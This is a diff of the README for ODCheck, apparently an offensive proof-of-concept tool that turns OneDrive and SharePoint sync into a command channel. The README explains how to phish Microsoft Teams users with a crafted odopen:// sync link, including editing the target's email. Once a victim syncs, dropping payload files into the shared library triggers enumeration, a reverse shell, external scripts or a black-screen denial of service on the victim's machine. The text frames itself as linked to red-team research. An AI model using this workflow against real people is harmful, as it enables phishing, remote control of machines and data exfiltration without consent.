@@ -1,11 +1,13 @@
 # DISCLAIMER:
 This tool is to be used for educational purposes only. I do not take responsibility if you use this in any other way. 
 
-It's a proof of concept solution that was created for https://collectingflags.com/research/file-extension-spoofing-in-microsoft-sharepoint-onedrive-and-teams/ If you use this for malicious reasons, you will most likely get caught. Don't do it.
+It's a proof of concept solution that was created for https://collectingflags.com/research/file-extension-spoofing-in-microsoft-sharepoint-onedrive-and-teams/ 
+
+If you use this for malicious reasons, you will most likely get caught. Don't do it.
 
 # ODCheck
 
-ODCheck is a C2-like proof-of-concept solution designed to evaluate systems against data exfiltration through OneDrive sync traffic. The ODOpen URL can be used for spear phishing in the Microsoft Teams desktop client to establish auto sync connections (with user interaction). 
+ODCheck is a C2-like proof-of-concept solution designed to evaluate systems against data exfiltration through OneDrive sync traffic. The ODOpen URL can be used for spear phishing in the Microsoft Teams desktop client to establish auto sync connections (with user interaction), which enables the communication channel that ODCheck uses. 
 
 If the connection is successful to an attacker controlled library and the user executes ODCheck, then further commands can be run on the machine based on the file names that are detected in the sync folder. The prebuilt tools and scripts available with ODCheck can help test for the following MITRE techniques:
 
@@ -31,11 +33,11 @@ Install-Module PS2EXE
 git clone https://github.com/itssixtyn3in/ODCheck
 
 # Run wizard.ps1 to start the configuration prompts
-.\manager.ps1
+.\wizard.ps1
 ```
 ODCheck provides a few customization options from here that can be used, depending on what all you want to test.
 
-- When configuring ODCheck, the file names that it watches for will be randomized and copied to the 'Payload' folder. If the files are dropped into the Sharepoint library, then the mapped commands will run once the file syncs. The setup will also require that you know the tenant and document library name that you will be using for the mutual sync connection. This information will be required to setup the sync connection to the correct local folder.
+- When configuring ODCheck, the file names that it watches for will be randomized and copied to the 'Payload' folder. If the files are dropped into the Sharepoint library, then the mapped commands will run once the file syncs. The setup will also require that you know the tenant and document library name that you will be using for the mutual sync connection (dont forget to add the Documents part shown in the video). This information will be required to setup the sync connection to the correct local folder.
 
 - The script will ask you for your preferred PowerShell reverse shell command and external script URL.
 
@@ -56,7 +58,7 @@ ODCheck provides a few customization options from here that can be used, dependi
   
  ![onedrive_link-1024x231](https://github.com/itssixtyn3in/ODCheck/assets/130003354/40d0c5a7-c598-4a7f-adfb-349c533b7724)
 
- Your link for the sync connection will look similar to this:
+ Your link for the sync connection will look similar to what you see below. You will want to change the &userEmail parameter to the email of the user that you're targeting.
  ```
  odopen://sync?userId=&userEmail=user%40email%2Ecom&isSiteAdmin=1&siteId=%7B123456e2%2D77be%2D4e43%2D9301%2D2d6cc8d5f778%7D&webId=%7B88af89a5%2D547e%2D44e5%2Dbab9%2Dcf1b27958693%7D&webTitle=OneDriveHealthCheck&webTemplate=64&webLogoUrl=%2Fsites%2FOneDriveHealthCheck2%2F%5Fapi%2FGroupService%2FGetGroupImage%3Fid%3D%27bdbb85bc%2D127a%2D4d63%2D95a6%2Dadaaf1394c1b%27%26hash%3D638490900916829775&webUrl=https%3A%2F%2Fexample%2Esharepoint%2Ecom%2Fsites%2FOneDriveHealthCheck2&onPrem=0&libraryType=3&listId=95e13011%2D92c1%2D488b%2Db46f%2D6d7b7b31fe0b&listTitle=Documents&scope=OPENLIST
 ```
@@ -78,7 +80,7 @@ If the user clicks on the website tab, then the sync connection is automatically
 Once a sync connection has been set up to the Sharepoint Document Library and the ODCheck client has been executed, then commands can be executed by dropping the payload files into the shared sync folder. 
 
 - Enumeration: Runs multiple Windows enumeration commands and returns the output into the sync folder.
-- Reverse Shell: Attempts to run an external script that spawns a reverse shell.
+- Reverse Shell: Attempts to run your reverse shell command.
 - DOS Condition: Attempts to trigger CVE-2023-32214 which causes a blackscreen for the user if ms-cxh-full:// is available. The screen will reappear if the machine is restarted.
 - External Scripts: Attempts to run an external PowerShell script for customization purposes.
 - Tool Move: Attempts to move the specified file from the OneDrive folder into Downloads (or another specified folder if manually changed in the script)
